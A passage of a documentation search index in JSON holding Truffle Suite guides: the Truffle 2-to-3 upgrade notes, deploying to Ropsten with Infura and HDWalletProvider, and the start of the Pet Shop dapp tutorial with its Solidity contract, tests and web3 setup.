\u26a0\ufe0f In Truffle 2.0, your contract abstractions managed your networks in a naive way, and added constructs like a \"default network\" that opened up the possibility of using the wrong network artifacts and deployed addresses at the wrong time. This provided a fancy and easy to use syntax -- i.e., MyContract.deployed().myFunction(...) -- but it left your code open to errors. Truffle 3.0 changes this syntax, where .deployed() is now thennable, like a promise (see example below). Similarly, this makes your contract abstractions seamlessly integrate with EIP 190 , Ethereum's package management standard. All of this is for the better, but it means you'll have some changes to make all across the board. In the general use case, here is how the new syntax differs from the old: v2.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed (). someFunction (). then ( function ( tx ) { // Do something after the someFunction() transaction executed }); v3.0 MyContract . setProvider ( someWeb3Provider ); MyContract . deployed (). then ( function ( instance ) { return instance . someFunction (); }). then ( function ( result ) { // Do something after the someFunction() transaction executed }); This syntax is a little more verbose, but it ensures the correct network artifacts are used based on the Ethereum client the abstraction is connected to. Note that in v3.0, you may need to correctly scope your deployed instance if you want to perform multiple actions with it in the same promise chain: MyContract . setProvider ( someWeb3Provider ); var deployed ; MyContract . deployed (). then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }). then ( function ( result ) { return deployed . anotherFunction (); }). then ( function ( result ) { // etc. });","title":"Contract Abstractions: .deployed() is now thennable"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#contract-abstractions-transaction-result-objects","text":"People have long complained that events are hard to watch for in Web3. Similarly, in most use cases, events aren't used via a contract observer pattern; instead, in practice, events are used to check specific results of a specific transaction. Though the contract observer pattern for events is still available, we made the latter use case much easier, which required breaking changes to the return value of transactions. In v2.0, a transaction simply returned the transaction hash. In v3.0, transactions return a result object with a wealth of information about that transaction. v2.0 MyContract . deployed (). someFunction (). then ( function ( tx ) { // tx is the transaction id (hash) of the transaction executed }); v3.0 MyContract . deployed (). then ( function ( instance ) { deployed = instance ; return deployed . someFunction (); }). then ( function ( result ) { // result is an object with the following values: // // result.tx => transaction hash, string // result.logs => array of decoded events that were triggered within this transaction // result.receipt => transaction receipt object, which includes gas used }); In Truffle 3.0, it's now much easier to detect if an event was fired as a result of your transaction. Here's a Javascript test for a hypothetical PackageIndex contract and ReleasePublished event: var assert = require ( \"assert\" ); var PackageIndex = artifacts . require ( \"PackageIndex.sol\" ); contract ( \"PackageIndex\" , function ( accounts ) { it ( \"publishes a release correctly\" , function () { return PackageIndex . deployed (). then ( function ( deployed ) { return deployed . publish ( \"v2.0.0\" ); }). then ( function ( result ) { // This result object is what provides us with the information we need. // result.logs, specifically for this example. var found_published_event = false ; for ( var i = 0 ; i < result . logs . length ; i ++ ) { var log = result . logs [ i ]; if ( log . event == \"ReleasePublished\" ) { found_published_event = true ; break ; } } assert ( found_published_event , \"Uh oh! We didn't find the published event!\" ) }); }); }); We have to search through all returned events to ensure we found the one we wanted, but this is certainly better than using PackageIndex.ReleasePublished.watch(...) , and we can keep event processing within our application's (or test's) normal control flow.","title":"Contract Abstractions: Transaction result objects"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#build-pipeline-no-more-builder-by-default","text":"In Truffle 1.0 and 2.0, things were heavily geared toward building web applications, and so Truffle shipped with a default build pipeline that could get your dapp up and running quickly. This build pipeline was magical: It did everything for you, and you didn't have to lift a finger. This was good for some use cases, but it became evidently clear that in any other use case the pipeline was very brittle. Over the last year, Ethereum-enabled applications have only been growing. What started out as solely a platform for web application, now dapps can be written in native languages and run as standalone applications on mobile and the desktop. Truffle has always intended to support these use cases, and so that's why we removed the default build pipeline from Truffle. You can still write your own custom build pipeline if you'd like to tightly integrate it with Truffle, but by default Truffle will focus on continuing to be the best tool for smart contracts around. We'll let the better build pipelines -- like webpack , browserify , Grunt , Metalsmith -- do the job of, well, building. Now, just because the build pipeline has been removed by default doesn't mean you don't have options. At Truffle, we care about your developer experience and so would never leave you hanging. In general there are two options for you to choose from, but for the latter option what you'll do is heavily dependent on which build tool (i.e., webpack) you choose to use. Let's go over the options below.","title":"Build Pipeline: No more builder, by default"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#use-the-old-pipeline-in-truffle-30","text":"If you're using the default build pipeline in Truffle 2.0 and would like to upgrade to 3.0, you're not out of luck. We've upgraded the truffle-default-builder so it can work seamlessly with Truffle 3.0. This will be the last time we update the default builder though as engineering for all possible use cases is too complex. So we recommend you eventually choose a different build system later down the line. The default builder no longer ships with Truffle by default. So for Truffle 3.0, you first need to make truffle-default-builder a dependency of your project by running the following command within your project's folder: $ npm install truffle-default-builder --save Once installed, you can use the default builder within your truffle.js configuration file. Let's have a look at how your configuration file changes from v2.0 to v3.0, using a very simple build configuration: v2.0 : truffle.js module . exports = { build : { \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" }, rpc : { host : \"localhost\" , port : 8545 } }; v3.0 : truffle.js var DefaultBuilder = require ( \"truffle-default-builder\" ); module . exports = { build : new DefaultBuilder ({ \"index.html\" : \"index.html\" , \"app.js\" : [ \"javascripts/app.js\" ], \"app.css\" : [ \"stylesheets/app.css\" ], \"images/\" : \"images/\" }), networks : { development : { host : \"localhost\" , port : 8545 , network_id : \"*\" // Match any network id } } }; You'll notice that in version 3.0 we require 'd the default builder as a dependency and then passed that object into our configuration. Otherwise, the configuration was the same! Now, be aware that the default builder does use the latest contract abstractions ( truffle-contract ), so you will still need to edit your application to account for the breaking changes mentioned above.","title":"Use the old pipeline in Truffle 3.0"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#use-a-custom-build-process-build-tool","text":"Custom build processes are not hard to write. Instead, what's hard is writing a build process that fits all shapes and sizes. We now recommend you look into the many build tools available to you that best fits your application. We've already mentioned webpack , browserify , Grunt , and Metalsmith , but there are many others, and their features run the gamut based on the context of the application being built and the features that you need. Whether you're building an application to run in the browser, or a command line tool, a Javascript library or a native mobile application, bootstrapping your contracts is the same, and using your deployed contract artifacts follows the same general process no matter the app you're building. When configuring your build tool or application, you'll need to perform the following steps; Get all your contract artifacts into your build pipeline / application. This includes all of the .json files within the ./build/contracts directory. Turn those .json contract artifacts into contract abstractions that are easy to use, via truffle-contract . Provision those contract abstractions with a Web3 provider. In the browser, this provider might come from Metamask or Mist , but it could also be a custom provider you've configured to point to Infura or any other Ethereum client. Use your contracts! In Node, this is very easy to do. Let's take a look at an example that shows off the \"purest\" way of performing the above steps, since it exists outside of any build process or tool. // Step 1: Get a contract into my application var json = require ( \"./build/contracts/MyContract.json\" ); // Step 2: Turn that contract into an abstraction I can use var contract = require ( \"truffle-contract\" ); var MyContract = contract ( json ); // Step 3: Provision the contract with a web3 provider MyContract . setProvider ( new Web3 . providers . HttpProvider ( \"http://localhost:8545\" )); // Step 4: Use the contract! MyContract . deployed (). then ( function ( deployed ) { return deployed . someFunction (); }); All build processes and contract bootstrapping will follow this pattern. The key when setting up your own custom build process is to ensure you're consuming all of your contract artifacts and provisioning your abstractions correctly.","title":"Use a custom build process / build tool"},{"location":"guides/upgrading-from-truffle-2-to-3/index.html#fin","text":"That's it! That's all you need to know to upgrade from Truffle 2.0 to 3.0. It might require a bit of work, but the changes are surely worth it. If you have questions, Truffle has a vibrant community of Trufflers available 24/7 to help you with any issues you may have. Don't hesitate to ask for help, and we wish you a happy 3.0! -- The Truffle Team","title":"Fin"},{"location":"guides/using-infura-custom-provider/index.html","text":"Infura\u2019s API suite provides instant HTTPS and WebSocket access to the Ethereum and IPFS networks. By using Infura, you can connect easily to Web 3.0 without having to spin-up and maintain your own infrastructure. Their core service is free and provides everything you need to start building awesome decentralized applications today! You may not be familiar with Infura by name, but if you've used MetaMask then you've used Infura, as it is the Ethereum provider that powers MetaMask. For security reasons, Infura does not manage your private keys, which means Infura cannot sign transactions on your behalf. However, Truffle can sign transactions through the use of its HDWalletProvider . This provider can handle the transaction signing as well as the connection to the Ethereum network. ( Read more about HDWalletProvider .) This tutorial will show you how to use Infura to migrate an existing dapp to an Ethereum network supported by Infura. In this specific instance, we'll migrate to Ropsten. We'll assume that you already have a dapp to migrate. If you want a test dapp, feel free to use our Pet Shop tutorial dapp. Install HDWalletProvider \u00b6 Truffle's HDWalletProvider is a separate npm package: npm install @truffle/hdwallet-provider Note : If you are on Windows and get an `MSBUILD` error, you may need to install the Windows build tools. In a terminal with Administrator rights, run `npm install -g windows-build-tools` and then try installation again. Register with Infura and create a new project \u00b6 Before you can use Infura, you need to register . Upon registration, this guide will walk you through creating a new project, authenticating with your new Project ID and Secret, securely copying your keys and selecting the appropriate network endpoint. Configure your Truffle project \u00b6 The next step is to edit your truffle-config.js file to use HDWalletProvider and provide all the necessary configuration for deploying to Ropsten. First, define the HDWalletProvider object in your configuration file. Add this line at the top of your truffle-config.js file: const HDWalletProvider = require ( \"@truffle/hdwallet-provider\" ); Next, provide a reference to your mnemonic that generates your accounts. If you don't have a mnemonic, you can generate one using an online mnemonic generator or a hardware wallet such as a product from Ledger . const mnemonic = \"orange apple banana ... \" ; Warning : In production, we highly recommend storing the mnemonic in another (secret) file, to reduce the risk of the mnemonic becoming known. If someone knows your mnemonic, they have all of your addresses and private keys! Add a Ropsten network definition: module . exports = { networks : { ropsten : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/<INFURA_PROJECT_ID>\" ) }, network_id : 3 } } }; Things to notice: While the example has only a single network defined, you can define multiple networks as normal. The provider for the ropsten network definition instantiates the HDWalletProvider . The HDWalletProvider takes as arguments a mnemonic and the desired network. A list of Infura-supported networks is available in the Endpoints dropdown on your Infura Project Settings page. Make sure to replace <INFURA_PROJECT_ID> with your Infura Project ID. The provider value is wrapped in a function, which ensures that it won't get initialized until it's needed. This is especially important if connecting to multiple networks. (See the Networks configuration section of the documentation for more on this topic.) Note : If you encounter issues with this construction, you can skip the function wrapper and use this instead: provider: new HDWalletProvider(mnemonic, \"https://ropsten.infura.io/v3/<INFURA_PROJECT_ID>\"), Without any other arguments, the account in charge of migration will be the first one generated by the mnemonic. But if desired, you can pass in an argument to specify which account to use. As an example, to use the third account: new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/<INFURA_PROJECT_ID>\" , 2 ); (Recall that the index is zero-based, so 2 is the third address.) Use an ether faucet \u00b6 Make sure you have enough ether in your account to do the deployment. You can acquire ether on the Ropsten network through a service known as a faucet. While there are multiple faucet sites out there, one service we recommend is hosted by MetaMask . Navigate to MetaMask's Test Ether Faucet . Connect to the Ropsten Test Network using MetaMask . The faucet will link to your first account. Click \"Request 1 Ether From Faucet\" to submit your request. Within a short period of time, your account will be populated with the requested ether. We are now ready to deploy to Ropsten! Deploy the contract \u00b6 Compile your project, if not already done: truffle compile Deploy to the Ropsten network: truffle migrate --network ropsten If all goes well, you should see a response that looks similar to the following: Starting migrations... ====================== > Network name: 'ropsten' > Network id: 3 > Block gas limit: 0x6691b7 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x166c1791caa73cca6a75fe4258866bd1f2d1bcf2cd4c3a2a1e03fab29c42829d > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 ...... ...... Note that your transaction hash and contract address will be different from the ones above. Note : If you receive an error `Error: Exceeds block gas limit `, you may need to manually set the gas limit for your contract. See the [Truffle Configuration](/docs/advanced/configuration) documentation for details. If you want to verify that your contract was deployed successfully, you can check this on the Ropsten section of Etherscan . In the search field, type in the transaction ID for your contract. In the above example, the transaction ID is: 0x166c1791caa73cca6a75fe4258866bd1f2d1bcf2cd4c3a2a1e03fab29c42829d You should see details about the transaction, including the block number where the transaction was secured. Congratulations! You've deployed your contract to Ropsten using the combined power of Infura and Truffle.","title":"Using Infura (or a custom provider)"},{"location":"guides/using-infura-custom-provider/index.html#install-hdwalletprovider","text":"Truffle's HDWalletProvider is a separate npm package: npm install @truffle/hdwallet-provider Note : If you are on Windows and get an `MSBUILD` error, you may need to install the Windows build tools. In a terminal with Administrator rights, run `npm install -g windows-build-tools` and then try installation again.","title":"Install HDWalletProvider"},{"location":"guides/using-infura-custom-provider/index.html#register-with-infura-and-create-a-new-project","text":"Before you can use Infura, you need to register . Upon registration, this guide will walk you through creating a new project, authenticating with your new Project ID and Secret, securely copying your keys and selecting the appropriate network endpoint.","title":"Register with Infura and create a new project"},{"location":"guides/using-infura-custom-provider/index.html#configure-your-truffle-project","text":"The next step is to edit your truffle-config.js file to use HDWalletProvider and provide all the necessary configuration for deploying to Ropsten. First, define the HDWalletProvider object in your configuration file. Add this line at the top of your truffle-config.js file: const HDWalletProvider = require ( \"@truffle/hdwallet-provider\" ); Next, provide a reference to your mnemonic that generates your accounts. If you don't have a mnemonic, you can generate one using an online mnemonic generator or a hardware wallet such as a product from Ledger . const mnemonic = \"orange apple banana ... \" ; Warning : In production, we highly recommend storing the mnemonic in another (secret) file, to reduce the risk of the mnemonic becoming known. If someone knows your mnemonic, they have all of your addresses and private keys! Add a Ropsten network definition: module . exports = { networks : { ropsten : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/<INFURA_PROJECT_ID>\" ) }, network_id : 3 } } }; Things to notice: While the example has only a single network defined, you can define multiple networks as normal. The provider for the ropsten network definition instantiates the HDWalletProvider . The HDWalletProvider takes as arguments a mnemonic and the desired network. A list of Infura-supported networks is available in the Endpoints dropdown on your Infura Project Settings page. Make sure to replace <INFURA_PROJECT_ID> with your Infura Project ID. The provider value is wrapped in a function, which ensures that it won't get initialized until it's needed. This is especially important if connecting to multiple networks. (See the Networks configuration section of the documentation for more on this topic.) Note : If you encounter issues with this construction, you can skip the function wrapper and use this instead: provider: new HDWalletProvider(mnemonic, \"https://ropsten.infura.io/v3/<INFURA_PROJECT_ID>\"), Without any other arguments, the account in charge of migration will be the first one generated by the mnemonic. But if desired, you can pass in an argument to specify which account to use. As an example, to use the third account: new HDWalletProvider ( mnemonic , \"https://ropsten.infura.io/v3/<INFURA_PROJECT_ID>\" , 2 ); (Recall that the index is zero-based, so 2 is the third address.)","title":"Configure your Truffle project"},{"location":"guides/using-infura-custom-provider/index.html#use-an-ether-faucet","text":"Make sure you have enough ether in your account to do the deployment. You can acquire ether on the Ropsten network through a service known as a faucet. While there are multiple faucet sites out there, one service we recommend is hosted by MetaMask . Navigate to MetaMask's Test Ether Faucet . Connect to the Ropsten Test Network using MetaMask . The faucet will link to your first account. Click \"Request 1 Ether From Faucet\" to submit your request. Within a short period of time, your account will be populated with the requested ether. We are now ready to deploy to Ropsten!","title":"Use an ether faucet"},{"location":"guides/using-infura-custom-provider/index.html#deploy-the-contract","text":"Compile your project, if not already done: truffle compile Deploy to the Ropsten network: truffle migrate --network ropsten If all goes well, you should see a response that looks similar to the following: Starting migrations... ====================== > Network name: 'ropsten' > Network id: 3 > Block gas limit: 0x6691b7 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x166c1791caa73cca6a75fe4258866bd1f2d1bcf2cd4c3a2a1e03fab29c42829d > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 ...... ...... Note that your transaction hash and contract address will be different from the ones above. Note : If you receive an error `Error: Exceeds block gas limit `, you may need to manually set the gas limit for your contract. See the [Truffle Configuration](/docs/advanced/configuration) documentation for details. If you want to verify that your contract was deployed successfully, you can check this on the Ropsten section of Etherscan . In the search field, type in the transaction ID for your contract. In the above example, the transaction ID is: 0x166c1791caa73cca6a75fe4258866bd1f2d1bcf2cd4c3a2a1e03fab29c42829d You should see details about the transaction, including the block number where the transaction was secured. Congratulations! You've deployed your contract to Ropsten using the combined power of Infura and Truffle.","title":"Deploy the contract"},{"location":"policy/index.html","text":"","title":"Truffle Suite"},{"location":"staff/index.html","text":"","title":"Truffle Suite"},{"location":"trufflecon2020/index.html","text":"","title":"Truffle Suite"},{"location":"tutorial/index.html","text":".md-typeset h1, .md-content__button { display: none; } This tutorial will take you through the process of building your first dapp---an adoption tracking system for a pet shop! This tutorial is meant for those with a basic knowledge of Ethereum and smart contracts, who have some knowledge of HTML and JavaScript, but who are new to dapps. Note : For Ethereum basics, please read the Truffle Ethereum Overview tutorial before proceeding. In this tutorial we will be covering: Setting up the development environment Creating a Truffle project using a Truffle Box Writing the smart contract Compiling and migrating the smart contract Testing the smart contract Creating a user interface to interact with the smart contract Interacting with the dapp in a browser Background \u00b6 Pete Scandlon of Pete's Pet Shop is interested in using Ethereum as an efficient way to handle their pet adoptions. The store has space for 16 pets at a given time, and they already have a database of pets. As an initial proof of concept, Pete wants to see a dapp which associates an Ethereum address with a pet to be adopted. The website structure and styling will be supplied. Our job is to write the smart contract and front-end logic for its usage. Setting up the development environment \u00b6 There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Git Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. We also will be using Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. You can download Ganache by navigating to http://truffleframework.com/ganache and clicking the \"Download\" button. Note : If you are developing in an environment without a graphical interface, you can also use Truffle Develop, Truffle's built-in personal blockchain, instead of Ganache. You will need to change some settings---such as the port the blockchain runs on---to adapt the tutorial for Truffle Develop. Creating a Truffle project using a Truffle Box \u00b6 Truffle initializes in the current directory, so first create a directory in your development folder of choice and then moving inside it. mkdir pet-shop-tutorial cd pet-shop-tutorial We've created a special Truffle Box just for this tutorial called pet-shop , which includes the basic project structure as well as code for the user interface. Use the truffle unbox command to unpack this Truffle Box. truffle unbox pet-shop Note : Truffle can be initialized a few different ways. Another useful initialization command is `truffle init`, which creates an empty Truffle project with no example contracts included. For more information, please see the documentation on Creating a project . Directory structure \u00b6 The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts truffle-config.js : Truffle configuration file The pet-shop Truffle Box has extra files and folders in it, but we won't worry about those just yet. Writing the smart contract \u00b6 We'll start our dapp by writing the smart contract that acts as the back-end logic and storage. Create a new file named Adoption.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract Adoption { } Things to notice: The minimum version of Solidity required is noted at the top of the contract: pragma solidity ^0.5.0; . The pragma command means \" additional information that only the compiler cares about \", while the caret symbol (^) means \" the version indicated or higher \". Like JavaScript or PHP, statements are terminated with semicolons. Variable setup \u00b6 Solidity is a statically-typed language, meaning data types like strings, integers, and arrays must be defined. Solidity has a unique type called an address . Addresses are Ethereum addresses, stored as 20 byte values. Every account and smart contract on the Ethereum blockchain has an address and can send and receive Ether to and from this address. Add the following variable on the next line after contract Adoption { . address [ 16 ] public adopters ; Things to notice: We've defined a single variable: adopters . This is an array of Ethereum addresses. Arrays contain one type and can have a fixed or variable length. In this case the type is address and the length is 16 . You'll also notice adopters is public. Public variables have automatic getter methods, but in the case of arrays a key is required and will only return a single value. Later, we'll write a function to return the whole array for use in our UI. Your first function: Adopting a pet \u00b6 Let's allow users to make adoption requests. Add the following function to the smart contract after the variable declaration we set up above. // Adopting a pet function adopt ( uint petId ) public returns ( uint ) { require ( petId >= 0 && petId <= 15 ); adopters [ petId ] = msg.sender ; return petId ; } Things to notice: In Solidity the types of both the function parameters and output must be specified. In this case we'll be taking in a petId (integer) and returning an integer. We are checking to make sure petId is in range of our adopters array. Arrays in Solidity are indexed from 0, so the ID value will need to be between 0 and 15. We use the require() statement to ensure the ID is within range. If the ID is in range, we then add the address that made the call to our adopters array. The address of the person or smart contract who called this function is denoted by msg.sender . Finally, we return the petId provided as a confirmation. Your second function: Retrieving the adopters \u00b6 As mentioned above, array getters return only a single value from a given key. Our UI needs to update all pet adoption statuses, but making 16 API calls is not ideal. So our next step is to write a function to return the entire array. Add the following getAdopters() function to the smart contract, after the adopt() function we added above: // Retrieving the adopters function getAdopters () public view returns ( address [ 16 ] memory ) { return adopters ; } Things to notice: Since adopters is already declared, we can simply return it. Be sure to specify the return type (in this case, the type for adopters ) as address[16] memory . memory gives the data location for the variable. The view keyword in the function declaration means that the function will not modify the state of the contract. Further information about the exact limits imposed by view is available here . Compiling and migrating the smart contract \u00b6 Now that we have written our smart contract, the next steps are to compile and migrate it. Compilation \u00b6 Solidity is a compiled language, meaning we need to compile our Solidity to bytecode for the Ethereum Virtual Machine (EVM) to execute. Think of it as translating our human-readable Solidity into something the EVM understands. In a terminal, make sure you are in the root of the directory that contains the dapp and type: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . You should see output similar to the following: Compiling your contracts... =========================== > Compiling ./contracts/Adoption.sol > Compiling ./contracts/Migrations.sol > Artifacts written to /Users/cruzmolina/Code/truffle-projects/metacoin/build/contracts > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang Migration \u00b6 Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! A migration is a deployment script meant to alter the state of your application's contracts , moving it from one state to the next. For the first migration, you might just be deploying new code, but over time, other migrations might move data around or replace a contract with a new one. Note : Read more about migrations in the Truffle documentation . You'll see one JavaScript file already in the migrations/ directory: 1_initial_migration.js . This handles deploying the Migrations.sol contract to observe subsequent smart contract migrations, and ensures we don't double-migrate unchanged contracts in the future. Now we are ready to create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: var Adoption = artifacts . require ( \"Adoption\" ); module . exports = function ( deployer ) { deployer . deploy ( Adoption ); }; Before we can migrate our contract to the blockchain, we need to have a blockchain running. For this tutorial, we're going to use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. Note : Read more about Ganache in the Truffle documentation . Back in our terminal, migrate the contract to the blockchain. truffle migrate You should see output similar to the following: 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3b558e9cdf1231d8ffb3445cb2f9fb01de9d0363e0b97a17f9517da318c2e5af > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 > account: 0x8d9606F90B6CA5D856A9f0867a82a645e2DfFf37 > balance: 99 .99430184 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'Adoption' ............................. ............................. You can see the migrations being executed in order, followed by some information related to each migration. (Your information will differ.) In Ganache, note that the state of the blockchain has changed. The blockchain now shows that the current block, previously 0 , is now 4 . In addition, while the first account originally had 100 ether, it is now lower, due to the transaction costs of migration. We'll talk more about transaction costs later. You've now written your first smart contract and deployed it to a locally running blockchain. It's time to interact with our smart contract now to make sure it does what we want. Testing the smart contract using Solidity \u00b6 Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Solidity. 1. Create a new file named `TestAdoption.sol` in the `test/` directory. 1. Add the following content to the `TestAdoption.sol` file: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/Adoption.sol\" ; contract TestAdoption { // The address of the adoption contract to be tested Adoption adoption = Adoption ( DeployedAddresses . Adoption ()); // The id of the pet that will be used for testing uint expectedPetId = 8 ; //The expected owner of adopted pet is this contract address expectedAdopter = address ( this ); } We start the contract off with 3 imports: * `Assert.sol`: Gives us various assertions to use in our tests. In testing, **an assertion checks for things like equality, inequality or emptiness to return a pass/fail** from our test. [Here's a full list of the assertions included with Truffle](https://github.com/trufflesuite/truffle/blob/master/packages/resolver/solidity/Assert.sol). * `DeployedAddresses.sol`: When running tests, Truffle will deploy a fresh instance of the contract being tested to the blockchain. This smart contract gets the address of the deployed contract. * `Adoption`: The smart contract we want to test. Note : The first two imports are referring to global Truffle files, not a `truffle` directory. You should not see a `truffle` directory inside your `test/` directory. Then we define three contract-wide variables: * First, one containing the smart contract to be tested, calling the `DeployedAddresses` smart contract to get its address. * Second, the id of the pet that will be used to test the adoption functions. * Third, since the TestAdoption contract will be sending the transaction, we set the expected adopter address to **this**, a contract-wide variable that gets the current contract's address. ### Testing the adopt() function To test the `adopt()` function, recall that upon success it returns the given `petId`. We can ensure an ID was returned and that it's correct by comparing the return value of `adopt()` to the ID we passed in. 1. Add the following function within the `TestAdoption.sol` smart contract, after the declaration of `Adoption`: // Testing the adopt() function function testUserCanAdoptPet () public { uint returnedId = adoption . adopt ( expectedPetId ); Assert . equal ( returnedId , expectedPetId , \"Adoption of the expected pet should match what is returned.\" ); } Things to notice: * We call the smart contract we declared earlier with the ID of `expectedPetId`. * Finally, we pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `Assert.equal()`. ### Testing retrieval of a single pet's owner Remembering from above that public variables have automatic getter methods, we can retrieve the address stored by our adoption test above. Stored data will persist for the duration of our tests, so our adoption of pet `expectedPetId` above can be retrieved by other tests. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of a single pet's owner function testGetAdopterAddressByPetId () public { address adopter = adoption . adopters ( expectedPetId ); Assert . equal ( adopter , expectedAdopter , \"Owner of the expected pet should be this contract\" ); } After getting the adopter address stored by the adoption contract, we assert equality as we did above. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of all pet owners function testGetAdopterAddressByPetIdInArray () public { // Store adopters in memory rather than contract's storage address [ 16 ] memory adopters = adoption . getAdopters (); Assert . equal ( adopters [ expectedPetId ], expectedAdopter , \"Owner of the expected pet should be this contract\" ); } Note the **memory** attribute on `adopters`. The memory attribute tells Solidity to temporarily store the value in memory, rather than saving it to the contract's storage. Since `adopters` is an array, and we know from the first adoption test that we adopted pet `expectedPetId`, we compare the testing contracts address with location `expectedPetId` in the array. Testing the smart contract using JavaScript \u00b6 Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Javascript using the Chai and Mocha libraries. 1. Create a new file named `testAdoption.test.js` in the `test/` directory. 2. Add the following content to the `testAdoption.test.js` file: const Adoption = artifacts.require(\"Adoption\"); contract(\"Adoption\", (accounts) => { let adoption; let expectedAdopter; before(async () => { adoption = await Adoption.deployed(); }); describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); }); }); We start the contract by importing : * `Adoption`: The smart contract we want to test We begin our test by importing our `Adoption` contract using `artifacts.require`. **Note**: When writing this test, our callback function take the argument `accounts`. This provides us with the accounts available on the network when using this test. Then, we make use of the `before` to provide initial setups for the following: * Adopt a pet with id 8 and assign it to the first account within the test accounts on the network. * This function later is used to check whether the `petId: 8` has been adopted by `accounts[0]`. ### Testing the adopt function To test the `adopt` function, recall that upon success it returns the given `adopter`. We can ensure that the adopter based on given petID was returned and is compared with the `expectedAdopter` within the `adopt` function. 1. Add the following function within the `testAdoption.test.js` test file, after the declaration of `before` code block. describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); it(\"can fetch the address of an owner by pet id\", async () => { const adopter = await adoption.adopters(8); assert.equal(adopter, expectedAdopter, \"The owner of the adopted pet should be the first account.\"); }); }); Things to notice: * We call smart contract method `adopters` to see what address adopted the pet with `petID` 8. * Truffle imports `Chai` for the user so we can use the `assert` functions. We pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `assert.equal()`. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `testAdoption.test.js`. it(\"can fetch the collection of all pet owners' addresses\", async () => { const adopters = await adoption.getAdopters(); assert.equal(adopters[8], expectedAdopter, \"The owner of the adopted pet should be in the collection.\"); }); Since adopters is an array, and we know from the first adoption test that we adopted the pet with `petId` 8, we are comparing the contract's address with the address that we expect to find. Running the tests \u00b6 Back in the terminal, run the tests: truffle test If all the tests pass, you'll see console output similar to this: Using network 'development' . Compiling your contracts... =========================== > Compiling ./test/TestAdoption.sol > Artifacts written to /var/folders/z3/v0sd04ys11q2sh8tq38mz30c0000gn/T/test-11934-19747-g49sra.0ncrr > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang TestAdoption \u2713 testUserCanAdoptPet ( 91ms ) \u2713 testGetAdopterAddressByPetId ( 70ms ) \u2713 testGetAdopterAddressByPetIdInArray ( 89ms ) 3 passing ( 670ms ) Creating a user interface to interact with the smart contract \u00b6 Now that we've created the smart contract, deployed it to our local test blockchain and confirmed we can interact with it via the console, it's time to create a UI so that Pete has something to use for his pet shop! Included with the pet-shop Truffle Box was code for the app's front-end. That code exists within the src/ directory. The front-end doesn't use a build system (webpack, grunt, etc.) to be as easy as possible to get started. The structure of the app is already there; we'll be filling in the functions which are unique to Ethereum. This way, you can take this knowledge and apply it to your own front-end development. Instantiating web3 \u00b6 Open /src/js/app.js in a text editor. Examine the file. Note that there is a global App object to manage our application, load in the pet data in init() and then call the function initWeb3() . The web3 JavaScript library interacts with the Ethereum blockchain. It can retrieve user accounts, send transactions, interact with smart contracts, and more. Remove the multi-line comment from within initWeb3 and replace it with the following: // Modern dapp browsers... if ( window . ethereum ) { App . web3Provider = window . ethereum ; try { // Request account access await window . ethereum . enable (); } catch ( error ) { // User denied account access... console . error ( \"User 